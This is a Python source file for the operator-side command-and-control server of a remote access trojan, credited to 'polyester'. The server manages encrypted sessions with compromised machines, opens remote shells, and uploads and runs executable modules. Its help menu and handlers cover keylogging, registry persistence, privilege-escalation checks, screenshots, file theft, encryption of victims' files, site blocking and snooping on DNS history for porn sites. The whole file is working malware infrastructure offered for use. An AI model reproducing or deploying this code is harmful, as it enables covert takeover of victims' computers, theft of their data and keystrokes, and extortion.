import socket
import json
import time
import os
from rich.console import Console
from rich.table import Table
from Crypto.Util.Padding import pad ,unpad
from config import *
from Crypto.Cipher import AES
import base64
from adult import *
import threading

global key

RED = '\033[91m'
RESET = '\033[0m'
GREEN = '\033[92m'
BLUE = '\033[34m'

current = os.getcwd()

global keylog
keylog = False

print("checking connection encryption key.....")
if len(skey) != 32 or len(siv) != 16:
    print(RED + "ERROR! the AES encryption key must be 256 bits and the IV must be 128bits" + RESET)
    time.sleep(5)
    exit()
else:
    print(GREEN + "Valid" + RESET)

key = generate()
print("""



‚ñà‚ñà‚ñà‚ñà‚ñà‚ñà‚ïó‚ñë‚ñë‚ñà‚ñà‚ñà‚ñà‚ñà‚ïó‚ñë‚ñà‚ñà‚ïó‚ñë‚ñë‚ñë‚ñë‚ñë‚ñà‚ñà‚ïó‚ñë‚ñë‚ñë‚ñà‚ñà‚ïó‚ñë‚ñà‚ñà‚ñà‚ñà‚ñà‚ïó‚ñë‚ñà‚ñà‚ñà‚ñà‚ñà‚ñà‚ïó‚ñë
‚ñà‚ñà‚ïî‚ïê‚ïê‚ñà‚ñà‚ïó‚ñà‚ñà‚ïî‚ïê‚ïê‚ñà‚ñà‚ïó‚ñà‚ñà‚ïë‚ñë‚ñë‚ñë‚ñë‚ñë‚ïö‚ñà‚ñà‚ïó‚ñë‚ñà‚ñà‚ïî‚ïù‚ñà‚ñà‚ïî‚ïê‚ïê‚ñà‚ñà‚ïó‚ïö‚ïê‚ïê‚ïê‚ïê‚ñà‚ñà‚ïó
‚ñà‚ñà‚ñà‚ñà‚ñà‚ñà‚ïî‚ïù‚ñà‚ñà‚ïë‚ñë‚ñë‚ñà‚ñà‚ïë‚ñà‚ñà‚ïë‚ñë‚ñë‚ñë‚ñë‚ñë‚ñë‚ïö‚ñà‚ñà‚ñà‚ñà‚ïî‚ïù‚ñë‚ñà‚ñà‚ïë‚ñë‚ñë‚ïö‚ïê‚ïù‚ñë‚ñë‚ñà‚ñà‚ñà‚ïî‚ïê‚ïù
‚ñà‚ñà‚ïî‚ïê‚ïê‚ïê‚ïù‚ñë‚ñà‚ñà‚ïë‚ñë‚ñë‚ñà‚ñà‚ïë‚ñà‚ñà‚ïë‚ñë‚ñë‚ñë‚ñë‚ñë‚ñë‚ñë‚ïö‚ñà‚ñà‚ïî‚ïù‚ñë‚ñë‚ñà‚ñà‚ïë‚ñë‚ñë‚ñà‚ñà‚ïó‚ñà‚ñà‚ïî‚ïê‚ïê‚ïù‚ñë‚ñë
‚ñà‚ñà‚ïë‚ñë‚ñë‚ñë‚ñë‚ñë‚ïö‚ñà‚ñà‚ñà‚ñà‚ñà‚ïî‚ïù‚ñà‚ñà‚ñà‚ñà‚ñà‚ñà‚ñà‚ïó‚ñë‚ñë‚ñë‚ñà‚ñà‚ïë‚ñë‚ñë‚ñë‚ïö‚ñà‚ñà‚ñà‚ñà‚ñà‚ïî‚ïù‚ñà‚ñà‚ñà‚ñà‚ñà‚ñà‚ñà‚ïó

-made by polyester""")

def main():
    os.system("cls")
    print(welcome)
    print(GREEN + '[+] Waiting For The Incoming Connections ...' + RESET)
    while True:
        command = input('[üòä] Command & Control Center: ')
        match command:
            case 'list_sessions':
                counter = 0
                if ips == []:
                    print("no session")
                else:
                    for ip in ips:
                        print('Session ' + str(counter) + ' --- ' + str(ip).split(",")[0].replace("(", ""))
                        counter += 1
            case "list":
                if ips == []:
                    print("no ip connected")
                else:
                    print(ips)
            case "powershell":
                pass
            case str() if command[:2] == "cd":
                try:
                    os.chdir(command[3:])
                except Exception as e:
                    print(e)
            case str() if command[:7] == 'session':
                try:
                    num = int(command[8:])
                    tarnum = targets[num]
                    tarip = ips[num]
                    target_communication(target=tarnum, ip=tarip, flag=True)
                except socket.error as e:
                    if e.errno == 10054 or e.errno == 32:
                        print(RED + "target terminated the connection" + RESET)
                        print(RED + "returning to C2..." + RESET)
                        try:
                            targets.remove(tarnum)
                            ips.remove(tarip)
                        except Exception as e:
                            print(e)
                    else:
                        print(RED + f"socket error: {e}" + RESET)
                except:
                    print("No session ID found")
            case "exit" | "quit":
                for target in targets:
                    reliable_send(target, 'quit')
                    target.close()
                sock.close()
                exit()
            case str() if command[:4] == 'kill':
                try:
                    targ = targets[int(command[5:])]
                    ip = ips[int(command[5:])]
                    reliable_send(targ, 'quit')
                    targ.close()
                    targets.remove(targ)
                    ips.remove(ip)
                    print("session killed")
                except:
                    print("Failed")
            case str() if command[:7] == 'sendall':
                x = len(targets)
                i = 0
                try:
                    while i < x:
                        tarnumber = targets[i]
                        reliable_send(tarnumber, command[8:])
                        i += 1
                except:
                    print('Failed')
            case "help":
                print("""
    list                ---> list the ip connected
    session             ---> connect to a session
    kill                ---> kill a session
    sendall             ---> send the command to all ips
    list_sessions       ---> list sessions
    exit                ---> quit the C2 server
    """)
            case "":
                pass
            case _:
                os.system(command)

def reliable_send(target, data):
    data = base64.b64encode(encryptcon(data.encode("utf-8"))).decode("utf-8")
    sjson = json.dumps(data)
    target.send(sjson.encode())

def encryptcon(message):
    aes = AES.new(skey, AES.MODE_CBC, siv)
    padded = pad(message, AES.block_size)
    return aes.encrypt(padded)

def decryptcon(message):
    aes = AES.new(skey, AES.MODE_CBC, siv)
    decrypt = aes.decrypt(message)
    unpadded = unpad(decrypt, AES.block_size)
    return(unpadded)


def checkp(result):
    substring = "Record Name"
    result2 = []
    split = result.splitlines()
    for i in split:
        if substring in i:
            web = i.split(":")[1].replace(" ", "")
            if web in porn and web not in result2:
                result2.append(web)
            else:
                pass
        else:
            pass

    if len(result2) == 0:
        try:
            print("No porn sites detected")
        except:
            pass
    else:
        try:
            print(' ,'.join(result2) + " has been detected")
        except:
            pass

def reliable_recv(target):
    data = ''
    while True:
        try:
            data = data + target.recv(8096).decode().rstrip()
            return (decryptcon(base64.b64decode(json.loads(data)))).decode('utf-8')
        except ValueError:
            continue

def shell(target, ip):
    while True:
        command = input(BLUE + "Shell[üêö]> ")
        reliable_send(target, command)
        match command:
            case "exit":
                print("shell exited" + RESET)
                target_communication(target, ip, flag=False)
            case str() if command[:3] == 'cd ':
                pass
            case "clear" | "cls" :
                os.system("cls")
            case _:
                result = reliable_recv(target)
                print(result)

def upload_file(target, file_name):
    f = open(file_name, 'rb')
    target.send(f.read())

def download_file(target, file_name):
    f = open(file_name, 'wb')
    target.settimeout(1)
    chunk = target.recv(8096)
    while chunk:
        f.write(chunk)
        try:
            chunk = target.recv(8096)
        except socket.timeout:
            break
    target.settimeout(None)
    f.close()

def module(target, name):
    path = os.path.join(current, 'modules')
    try:
        os.chdir(path)
        exe = name + ".exe"
        if os.path.isfile(name + ".exe"):
            try:
                upload_file(target ,file_name=exe)
                print("payload uploaded")
                result = reliable_recv(target)
                print("\n\n\n OUTPUT:\n")
                print(BLUE + result +RESET)
            except:
                print("Upload failed")
        else:
            print("No such module 2")
    except:
        print("WHERE IS YOUR MODULES FOLDER????")

def target_communication(target, ip, flag):
    os.chdir(current)

    if flag == True:
        print(connection)
        print("\n\n you have connected!! have funüòâ\n\n\n")

    count = 0

    while True:
        command = input('[üòà]Session~%s: ' % str(ip))
        if command[:6] == "module":
            path = os.path.join(current ,"modules")
            try:
                os.chdir(path)
            except:
                print("no module folder")
                target_communication(target, ip, flag=False)
            exe = command[7:] + ".exe"
            if os.path.isfile(exe) == False:
                print("no such module")
                target_communication(target, ip, flag=False)
                    

        reliable_send(target, command)
        match command:
            case 'quit':
                print("exiting everything including C2")
                exit()
            case str() if command[:3] == 'cd ':
                pass
            case "clear" | "cls":
                os.system("cls")
            case str() if command[:6] == 'upload':
                try:
                    upload_file(target, command[7:])
                except:
                    print("failed to upload file")
            case str() if command[:8] == 'download':
                try:
                    download_file(target, command[9:])
                except:
                    print("failed to download file")
            case str() if command[:10] == 'screenshot':
                f = open('screenshot%d.png' % (count), 'wb')
                target.settimeout(5)
                chunk = target.recv(8096)
                while chunk:
                    f.write(chunk)
                    try:
                        chunk = target.recv(8096)
                    except socket.timeout:
                        break
                target.settimeout(None)
                f.close()
                print("screenshot saved as screenshot%d.png" % count)
                count += 1
                continue
            case 'encrypt':
                print("the fernet key is {}".format(key.decode('utf-8')))
                reliable_send(target, key.decode('utf-8'))
                filedirectory = input("Enter file path: ")
                if filedirectory == "exit":
                    print("exiting...")
                    target_communication()
                else:
                    reliable_send(target, filedirectory)
                    result = reliable_recv(target)
                    print(result)
            case "decrypt":
                print(("the fernet key is {}".format(key.decode('utf-8'))))
                reliable_send(target, key.decode('utf-8'))
                filedirectory = input("Enter encrypted file path: ")
                if filedirectory == "exit":
                    print("exiting...")
                    target_communication()
                else:
                    reliable_send(target, filedirectory)
                    result = reliable_recv(target)
                    print(result)
            case str() if command[:6] == "module":
                module(target, command[7:])
            case "background":
                print(delconnection)
                input("\n\n backgrounded the connection \n\n\n press enter to return back to C2......")
                os.system("cls")
                main()
            case "shell":
                try:
                    shell(target, ip)
                except Exception as e:
                    print(e)
            case "checkporn":
                checkp(reliable_recv(target))
            case "list_module":
                try:
                    path = os.path.join(current, 'modules')
                    os.chdir(path)
                    console = Console()
                    table = Table(show_header=True, header_style="bold")
                    table.add_column("Module name", justify="left")
                    table.add_column("Info", justify="right")
                    for file in os.listdir(path):
                        if file.split(".")[1] == "exe":
                            if os.path.isfile(file.split('.')[0] + ".sc"): 
                                with open(file.split('.')[0] + ".sc") as f:
                                    info = f.read() 
                                    table.add_row(file.split('.')[0], info)
                            else:
                                table.addrow(file.split(".")[0] , "UNKNOWN MODULE")
                    table.title = "MODULE"
                    table.border_style = "green"
                    console.print(table)
                except:
                    print("No modules folder")
            case 'help':
                print(GREEN + '''
                        :GENERAL COMMANDS:
            quit                                --> Quit Session With The Target
            clear                               --> Clear The Screen
            shell                               --> spawn a shell
            download <file name>                --> Download File From Target Machine
            quit                                --> terminate the connection between the listener and the client
            background                          --> background the connection
            clip_copy                           --> copies clipboard content
            display <url>                       --> display an url image
            

                         :KEYLOGGER:
            keylog_start                        --> Start The Keylogger
            keylog_dump                         --> Print Keystrokes That The Target Inputted
            keylog_stop                         --> Stop And Self Destruct Keylogger File

                        :PERSISTENCE:
            persistence <RegName> <fileName>    --> Create Persistence In Registry


                        :Enumeration:
            checkpriv                           --> check admin privilege
            screenshot                          --> get target screenshot

                        :Encryption:
            encrypt                            --> encrypt a single file
            decrypt                            --> decrypt a single file

                        :Internet control:
            blocksite                          --> blocks all website
            unblocksite                        --> unblock all website
                        
                           :Module:
            list_module                       --> list all available modules
            module <module name>              --> upload and execute a module

                        :PRIVILEGE ESCALATION:
            check_elevated                     --> checks for Always install elevated Vulnerability

                           :FUN:
            checkporn                           --> check the PC for visited porn websites using dns

            
            ''' + RESET) 
            case _:
                result = reliable_recv(target)
                print(result)


def accept_connections():
    while True:
        if stop_flag:
            break
        sock.settimeout(1)
        try:
            target, ip = sock.accept()
            targets.append(target)
            ips.append(ip)
            print(GREEN + str(ip).split(",")[0].replace("(", "") + ' has connected!' + RESET)
        except:
            pass

input("\n\npress enter to continue....")
targets = []
ips = []
stop_flag = False
sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
sock.bind((lhost, lport))
sock.listen(5)
t1 = threading.Thread(target=accept_connections)
t1.start()
main()
